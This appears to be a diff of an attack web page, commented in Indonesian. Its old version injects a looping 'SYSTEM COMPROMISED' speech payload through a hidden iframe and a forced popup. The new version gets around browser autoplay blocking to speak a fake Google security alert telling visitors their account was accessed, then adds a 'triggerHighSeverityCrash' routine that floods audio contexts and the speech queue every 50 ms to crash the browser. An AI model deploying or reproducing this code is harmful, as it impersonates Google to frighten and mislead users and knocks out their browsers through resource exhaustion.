@@ -3,122 +3,206 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Check</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111; color: #0f0; font-family: monospace; overflow: hidden; }
-  iframe { display: none; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
 <script>
 (function () {
   'use strict';
 
-  console.log("[!] Memulai Zero-Click TTS Loop...");
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // KONTEN UNTUK ABOUT:BLANK (TTS LOOP)
+  // TTS — TANPA CANCEL DI DALAM LOOP
   // ============================================
-  var payloadHTML = `
-    <!DOCTYPE html>
-    <html>
-    <head><title>Critical Alert</title></head>
-    <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
-      <h1>SYSTEM COMPROMISED</h1>
-      <p id="status">Memulai TTS Loop...</p>
-      <script>
-        (function() {
-          var count = 0;
-          var statusEl = document.getElementById('status');
-
-          function speak() {
-            if (!('speechSynthesis' in window)) return;
-
-            var u = new SpeechSynthesisUtterance("Warning. System hacked. Loop number " + count);
-            u.lang = 'en-US';
-            u.rate = 1.0;
-            u.volume = 1.0;
-
-            u.onstart = function() {
-              count++;
-              statusEl.innerText = "Loop: " + count;
-            };
-
-            u.onend = function() {
-              // LANGSUNG LOOP TANPA JEDA
-              setTimeout(speak, 100); 
-            };
-
-            window.speechSynthesis.speak(u);
-          }
-
-          // Coba mulai TTS
-          speak();
-        })();
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  // ============================================
-  // METODE 1: IFRAME INJECTION (Sering Lolos)
-  // ============================================
-  function injectZeroClickIframe() {
-    var iframe = document.createElement('iframe');
-    iframe.allow = "autoplay";
-    iframe.style.display = "none";
-    iframe.src = 'about:blank';
-    document.body.appendChild(iframe);
-
-    iframe.onload = function() {
-      try {
-        var doc = iframe.contentDocument || iframe.contentWindow.document;
-        doc.open();
-        doc.write(payloadHTML);
-        doc.close();
-        console.log("[!] Payload TTS disuntikkan ke iframe about:blank.");
-      } catch(e) {
-        console.log("[X] Gagal inject iframe: " + e.message);
-      }
-    };
-  }
-
-  // ============================================
-  // METODE 2: WINDOW.OPEN POPUP (Zero-Click)
-  // ============================================
-  function forceZeroClickPopup() {
-    // Mencoba membuka tab baru tanpa klik
-    var win = window.open('about:blank', '_blank');
-    
-    if (!win) {
-      console.log("[X] Popup diblokir oleh browser (Transient Activation dibutuhkan).");
-      return;
-    }
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
 
     try {
-      win.document.open();
-      win.document.write(payloadHTML);
-      win.document.close();
-      console.log("[!] Payload TTS disuntikkan ke Popup Window.");
-    } catch(e) {
-      console.log("[X] Gagal menulis ke popup: " + e.message);
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
+
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
+
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
     }
   }
 
   // ============================================
-  // EKSEKUSI (Zero-Click Trigger)
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
   // ============================================
-  
-  // Coba Iframe (Biasanya berhasil tanpa memicu popup blocker)
-  injectZeroClickIframe();
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  }
 
-  // Coba Popup (Mungkin diblokir jika tidak ada gesture)
-  setTimeout(function() {
-    forceZeroClickPopup();
-  }, 1000);
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
 
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
+
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
 })();
 </script>
 </body>
